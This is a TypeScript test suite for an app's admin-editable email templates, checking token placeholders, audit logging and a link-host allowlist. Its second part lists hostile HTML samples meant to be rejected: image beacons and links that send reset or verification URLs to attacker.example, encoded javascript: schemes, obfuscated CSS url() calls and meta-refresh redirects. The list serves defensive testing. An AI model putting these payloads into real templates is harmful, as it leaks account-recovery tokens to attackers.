import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { after, before, describe, it, mock } from 'node:test';

import {
  EMAIL_TEMPLATE_KEYS,
  type ApiErrorBody,
  type GetEmailTemplateResponse,
} from '@ferrum-nexus/shared';

import { REGISTRATION_SETTINGS_KEY } from '../auth/service.js';
import { DEFAULT_EMAIL_TEMPLATES } from '../email/templates.js';
import { TEMPLATE_LINK_HOSTS_SETTING } from '../email/template-links.js';
import { buildTestApp, TEST_PASSWORD, type TestApp, type TestSession } from './helpers.js';

const FALLBACK_WARNING =
  'Stored email template refused by the link policy; sending the built-in template';

describe('email template token boundaries', () => {
  let harness: TestApp;
  let founder: TestSession;
  let admin: TestSession;

  before(async () => {
    harness = await buildTestApp();
    founder = await harness.registerUser({ email: 'founder@example.test' });
    const account = await harness.registerUser({ email: 'editor@example.test' });
    const promoted = await harness.authed(founder, {
      method: 'PATCH',
      url: `/api/users/${account.user.id}`,
      payload: { role: 'admin' },
    });
    assert.equal(promoted.statusCode, 200, promoted.body);
    admin = await harness.loginUser('editor@example.test');
    assert.equal(admin.user.role, 'admin');
  });

  after(async () => {
    await harness.close();
  });

  it('advertises action URLs and never raw tokens for any template', async () => {
    for (const key of EMAIL_TEMPLATE_KEYS) {
      const response = await harness.authed(admin, {
        method: 'GET',
        url: `/api/admin/email-templates/${key}`,
      });
      assert.equal(response.statusCode, 200, response.body);
      const { available_variables: variables } = response.json<GetEmailTemplateResponse>();
      assert.ok(!variables.includes('reset_token'));
      assert.ok(!variables.includes('verification_token'));
      if (key === 'password_reset') assert.ok(variables.includes('reset_url'));
      if (key === 'verification') assert.ok(variables.includes('verification_url'));
    }
  });

  it('rejects retired placeholders in every field and key before writing anything', async () => {
    for (const key of EMAIL_TEMPLATE_KEYS) {
      for (const field of ['subject', 'body_html', 'body_text'] as const) {
        for (const variable of ['reset_token', 'verification_token']) {
          const response = await harness.authed(admin, {
            method: 'PUT',
            url: `/api/admin/email-templates/${key}`,
            payload: {
              subject: 'Subject',
              body_html: '<p>Body</p>',
              body_text: 'Body',
              [field]: `Before{{unknown}}After{{ \n${variable}\t }}End`,
            },
          });
          assert.equal(response.statusCode, 400, response.body);
          const { error } = response.json<ApiErrorBody>();
          assert.equal(error.code, 'VALIDATION_FAILED');
          assert.ok(error.message.includes(variable));
          assert.deepEqual(error.details, { field, variable });
          assert.equal(await harness.store.emailTemplates.get(key), null);
        }
      }
    }
    assert.equal((await harness.auditRows('admin.template_update')).length, 0);
  });

  it('keeps an admin-edited reset URL working after refusing a raw-token edit', async () => {
    const content = {
      subject: 'Recover your account',
      body_html: '<p>Résumé</p><a href="{{reset_url}}">Continue</a>',
      body_text: 'Résumé\n{{reset_url}}',
    };
    const saved = await harness.authed(admin, {
      method: 'PUT',
      url: '/api/admin/email-templates/password_reset',
      payload: content,
    });
    assert.equal(saved.statusCode, 200, saved.body);

    const rejected = await harness.authed(admin, {
      method: 'PUT',
      url: '/api/admin/email-templates/password_reset',
      payload: { ...content, body_html: '<p>{{reset_token}}</p>' },
    });
    assert.equal(rejected.statusCode, 400, rejected.body);

    const requested = await harness.app.inject({
      method: 'POST',
      url: '/api/auth/forgot-password',
      payload: { email: founder.user.email },
    });
    assert.equal(requested.statusCode, 200, requested.body);
    await harness.tick();
    const mail = harness.mailbox.sent.find((entry) => entry.to === founder.user.email);
    assert.ok(mail);
    const token = /\/reset-password\?token=([A-Za-z0-9_-]+)/.exec(mail.text)?.[1];
    assert.ok(token);
    const url = `${harness.config.publicUrl}/reset-password?token=${token}`;
    assert.equal(mail.subject, content.subject);
    assert.equal(mail.html, content.body_html.replace('{{reset_url}}', url));
    assert.equal(mail.text, content.body_text.replace('{{reset_url}}', url));
    assert.ok(!mail.html.replaceAll(url, '').includes(token));
    assert.ok(!mail.text.replaceAll(url, '').includes(token));

    const rows = await harness.auditRows('admin.template_update');
    assert.equal(rows.length, 1, 'the refused edit did not write an audit event');
    assert.equal(rows[0]?.actor_user_id, admin.user.id);
    assert.equal(rows[0]?.target_id, 'password_reset');
    assert.deepEqual(rows[0]?.details, {
      key: 'password_reset',
      body_html_sha256: createHash('sha256').update(content.body_html, 'utf8').digest('hex'),
      body_text_sha256: createHash('sha256').update(content.body_text, 'utf8').digest('hex'),
    });
  });

  it('delivers no token from a legacy reset template using only retired placeholders', async () => {
    // Model an override saved before the placeholders were retired.
    await harness.store.emailTemplates.upsert('password_reset', {
      subject: 'Reset{{reset_token}}',
      body_html: '<p>{{ reset_token }}</p>{{verification_token}}',
      body_text: 'Token: {{reset_token}}{{ verification_token }}',
    });
    const requested = await harness.app.inject({
      method: 'POST',
      url: '/api/auth/forgot-password',
      payload: { email: admin.user.email },
    });
    assert.equal(requested.statusCode, 200, requested.body);
    await harness.tick();
    const mail = harness.mailbox.sent.find((entry) => entry.to === admin.user.email);
    assert.deepEqual(mail, {
      to: admin.user.email,
      subject: 'Reset',
      html: '<p></p>',
      text: 'Token: ',
    });
  });

  it('renders legacy verification templates safely for registration and resend', async () => {
    await harness.store.settings.set(
      REGISTRATION_SETTINGS_KEY,
      { require_email_verification: true },
      false,
    );
    await harness.store.emailTemplates.upsert('verification', {
      subject: 'Verify{{verification_token}}{{reset_token}}',
      body_html: '<a href="{{verification_url}}">Verify</a>{{ verification_token }}{{reset_token}}',
      body_text: '{{verification_url}}\n{{verification_token}}|{{ reset_token }}',
    });
    const email = 'unverified@example.test';
    const registered = await harness.app.inject({
      method: 'POST',
      url: '/api/auth/register',
      payload: { email, password: TEST_PASSWORD, display_name: 'Unverified', role: 'client' },
    });
    assert.equal(registered.statusCode, 201, registered.body);
    const user = await harness.store.users.findByEmail(email);
    assert.ok(user);

    for (const flow of ['registration', 'resend']) {
      if (flow === 'resend') {
        // Remove the prior token to bypass the issuance throttle without waiting.
        await harness.store.verificationTokens.deleteForUser(user.id, 'email_verification');
        const resent = await harness.app.inject({
          method: 'POST',
          url: '/api/auth/resend-verification',
          payload: { email },
        });
        assert.equal(resent.statusCode, 200, resent.body);
      }
      harness.mailbox.clear();
      const tick = await harness.tick();
      assert.equal(tick.sent, 1, flow);
      const mail = harness.mailbox.sent[0];
      assert.ok(mail);
      const token = /\/verify-email\?token=([A-Za-z0-9_-]+)/.exec(mail.text)?.[1];
      assert.ok(token);
      const url = `${harness.config.publicUrl}/verify-email?token=${token}`;
      assert.deepEqual(mail, {
        to: email,
        subject: 'Verify',
        html: `<a href="${url}">Verify</a>`,
        text: `${url}\n|`,
      });
    }
  });
});

describe('email template destination boundaries', () => {
  let harness: TestApp;
  let founder: TestSession;
  let admin: TestSession;
  const safe = {
    subject: 'Account action',
    body_html: '<a href="{{reset_url}}">Continue</a>',
    body_text: 'Continue: {{reset_url}}\n',
  };

  before(async () => {
    harness = await buildTestApp({
      env: {
        NEXUS_PUBLIC_URL: 'https://portal.test',
        NEXUS_EMAIL_TEMPLATE_ALLOWED_LINK_HOSTS: 'assets.example.test',
      },
    });
    founder = await harness.registerUser({ email: 'link-founder@example.test' });
    const editor = await harness.registerUser({ email: 'link-editor@example.test' });
    const promoted = await harness.authed(founder, {
      method: 'PATCH',
      url: `/api/users/${editor.user.id}`,
      payload: { role: 'admin' },
    });
    assert.equal(promoted.statusCode, 200, promoted.body);
    admin = await harness.loginUser(editor.user.email);
    assert.equal(admin.user.role, 'admin');
  });

  after(async () => {
    await harness.close();
  });

  it('refuses image beacons, foreign hrefs and encoded or case-variant URLs on save', async () => {
    const attacks = [
      '<img src="https://attacker.example/?u={{reset_url}}">',
      '<a href="https://attacker.example/?u={{verification_url}}">Verify</a>',
      '<a hre&#102;="HTTPS://attacker.example/">Open</a>',
      '<img SRC="&#104;&#116;&#116;&#112;&#115;&#58;//attacker.example/pixel">',
      '<img src="&sol;&sol;attacker.example/pixel">',
      '<img src="//attacker.example/pixel">',
      '<img src="https://assets.example.test.attacker.example/pixel">',
      '<img src="https://assets.example.test:8443/pixel">',
      '<a href="http://portal.test/action">Wrong origin</a>',
      '<a href="https://portal.test:8443/action">Wrong port</a>',
      '<a href="https://portal.test@attacker.example/action">Credentials</a>',
      '<a href="java&#x09;script:alert(1)">Open</a>',
      '<img src="dAtA:text/html,hello">',
      '<p style="background:URL(https://attacker.example/pixel)">Hello</p>',
      '<p style="background:u\\72l(//attacker.example/pixel)">Hello</p>',
      '<p style="background:u/**/rl(//attacker.example/pixel)">Hello</p>',
      '<base href="https://attacker.example/">',
      '<meta http-equiv="refresh" content="0;url=https://attacker.example/">',
    ];
    for (const body_html of attacks) {
      const response = await harness.authed(admin, {
        method: 'PUT',
        url: '/api/admin/email-templates/password_reset',
        payload: { ...safe, body_html },
      });
      assert.equal(response.statusCode, 400, body_html);
      const { error } = response.json<ApiErrorBody>();
      assert.equal(error.code, 'VALIDATION_FAILED');
      assert.ok(error.message.includes('body_html'), error.message);
      assert.ok(error.message.includes(TEMPLATE_LINK_HOSTS_SETTING), error.message);
      assert.match(error.message, /host|placeholder|scheme|CSS|HTML|credentials/);
      assert.equal(await harness.store.emailTemplates.get('password_reset'), null);
    }
    assert.equal((await harness.auditRows('admin.template_update')).length, 0);
  });

  it('checks every field and refuses action URLs in every non-anchor attribute', async () => {
    for (const field of ['subject', 'body_html', 'body_text'] as const) {
      const response = await harness.authed(admin, {
        method: 'PUT',
        url: '/api/admin/email-templates/password_reset',
        payload: { ...safe, [field]: 'HTTPS://attacker.example/pixel' },
      });
      assert.equal(response.statusCode, 400, response.body);
      const { error } = response.json<ApiErrorBody>();
      assert.ok(error.message.includes(field));
      assert.ok(error.message.includes('attacker.example'));
      assert.ok(error.message.includes(TEMPLATE_LINK_HOSTS_SETTING));
    }
    for (const attribute of [
      'src',
      'action',
      'srcset',
      'data',
      'poster',
      'formaction',
      'background',
      'xlink:href',
      'title',
    ]) {
      for (const variable of ['reset_url', 'verification_url']) {
        const response = await harness.authed(admin, {
          method: 'PUT',
          url: '/api/admin/email-templates/password_reset',
          payload: { ...safe, body_html: `<a ${attribute}="{{${variable}}}">Open</a>` },
        });
        assert.equal(response.statusCode, 400, response.body);
        assert.ok(response.json<ApiErrorBody>().error.message.includes(attribute));
      }
    }
  });

  it('refuses concatenation even into approved URLs and other attributes', async () => {
    for (const body_html of [
      '<a href="https://portal.test/?u={{reset_url}}">Open</a>',
      '<a href="https://assets.example.test/?u={{reset_url}}">Open</a>',
      '<a href="{{reset_url}}/extra">Open</a>',
      '<a href="{{portal_url}}@attacker.example">Open</a>',
      '<a title="URL: {{reset_url}}">Open</a>',
      '<img href="{{reset_url}}">',
      '<p>{{reset_url}}</p>',
      '<p style="background:url({{reset_url}})">Hello</p>',
      '<a href="{{reset_url}}" href="/other">Open</a>',
      '<a href="{{reset_url}}" onclick="alert(1)">Open</a>',
      '<a {{reset_url}}="value">Open</a>',
    ]) {
      const response = await harness.authed(admin, {
        method: 'PUT',
        url: '/api/admin/email-templates/password_reset',
        payload: { ...safe, body_html },
      });
      assert.equal(response.statusCode, 400, body_html);
    }
    for (const body_text of [
      'https://portal.test/?u={{reset_url}}',
      '{{reset_url}}/extra',
      'prefix{{verification_url}}',
      'href="{{reset_url}}"',
      'hre&#102;="ftp://attacker.example/file"',
    ]) {
      const response = await harness.authed(admin, {
        method: 'PUT',
        url: '/api/admin/email-templates/password_reset',
        payload: { ...safe, body_text },
      });
      assert.equal(response.statusCode, 400, body_text);
    }
  });

  it('saves and renders defaults and an allowlisted image with an action link', async () => {
    for (const key of EMAIL_TEMPLATE_KEYS) {
      const saved = await harness.authed(admin, {
        method: 'PUT',
        url: `/api/admin/email-templates/${key}`,
        payload: DEFAULT_EMAIL_TEMPLATES[key],
      });
      assert.equal(saved.statusCode, 200, saved.body);
      const rendered = await harness.services.email.render(key, {
        reset_url: 'https://portal.test/reset-password?token=reset-secret',
        verification_url: 'https://portal.test/verify-email?token=verification-secret',
      });
      assert.ok(rendered.html.length);
      assert.ok(rendered.text.length);
    }
    const content = {
      ...safe,
      body_html:
        '<img src="HTTPS://ASSETS.EXAMPLE.TEST/logo.png">' +
        '<p style="background:url(https://assets.example.test/banner.png)">Hello</p>' +
        '<a HREF="{{ \nreset_url\t }}">Continue</a>',
    };
    const saved = await harness.authed(admin, {
      method: 'PUT',
      url: '/api/admin/email-templates/password_reset',
      payload: content,
    });
    assert.equal(saved.statusCode, 200, saved.body);
    await harness.services.email.enqueue({
      to: founder.user.email,
      templateKey: 'password_reset',
      vars: { reset_url: 'https://portal.test/reset-password?token=reset-secret' },
    });
    assert.equal((await harness.tick()).sent, 1);
    const mail = harness.mailbox.sent.at(-1);
    assert.ok(mail?.html.includes('HREF="https://portal.test/reset-password?token=reset-secret"'));
    assert.equal(mail.text, 'Continue: https://portal.test/reset-password?token=reset-secret\n');
  });

  it('falls back to the built-in template for a legacy beacon template', async () => {
    const warning = mock.method(harness.app.log, 'warn');
    try {
      for (const [key, variable] of [
        ['password_reset', 'reset_url'],
        ['verification', 'verification_url'],
      ] as const) {
        await harness.store.emailTemplates.upsert(key, {
          ...safe,
          body_html: `<img src="https://attacker.example/?u={{${variable}}}">`,
        });
        harness.mailbox.clear();
        const { created } = await harness.services.email.enqueue({
          to: founder.user.email,
          templateKey: key,
          vars: { [variable]: 'https://portal.test/action?token=secret-must-not-be-logged' },
          idempotencyKey: `legacy-beacon:${key}`,
        });
        assert.equal(created, true);
        assert.equal((await harness.tick()).claimed, 1);
        const mail =
          harness.mailbox.sent.at(-1) ??
          assert.fail('the built-in template must still be delivered');
        assert.ok(!mail.html.includes('attacker.example'));
        assert.ok(
          mail.html.includes('href="https://portal.test/action?token=secret-must-not-be-logged"'),
        );
      }
      harness.mailbox.clear();
      const requested = await harness.app.inject({
        method: 'POST',
        url: '/api/auth/forgot-password',
        payload: { email: founder.user.email },
      });
      assert.equal(requested.statusCode, 200, requested.body);
      assert.equal((await harness.tick()).claimed, 1);
      assert.ok(!harness.mailbox.sent.at(-1)?.html.includes('attacker.example'));
      const calls = warning.mock.calls.map((call) => call.arguments);
      assert.ok(calls.some((args) => args[1] === FALLBACK_WARNING));
      assert.ok(!JSON.stringify(calls).includes('secret-must-not-be-logged'));
    } finally {
      warning.mock.restore();
    }
  });

  it('rechecks interpolated variables and falls back for a refused stored template', async () => {
    await harness.store.emailTemplates.upsert('password_reset', {
      ...safe,
      body_html: '<a href="{{portal_url}}">Portal</a>',
    });
    await assert.rejects(
      harness.services.email.render('password_reset', { portal_url: 'https://attacker.example/' }),
      /host 'attacker.example'/,
    );
    await harness.store.emailTemplates.upsert('password_reset', {
      ...safe,
      body_html: '<img src="https://assets.example.test/logo.png">',
    });
    harness.config.emailTemplateAllowedLinkHosts = [];
    const warning = mock.method(harness.app.log, 'warn');
    try {
      const fallback = await harness.services.email.render('password_reset');
      assert.ok(!fallback.html.includes('assets.example.test'));
      assert.ok(fallback.html.includes('Set a new password'));
      const calls = warning.mock.calls.map((call) => call.arguments);
      assert.ok(calls.some((args) => args[1] === FALLBACK_WARNING));
    } finally {
      warning.mock.restore();
    }
  });
});
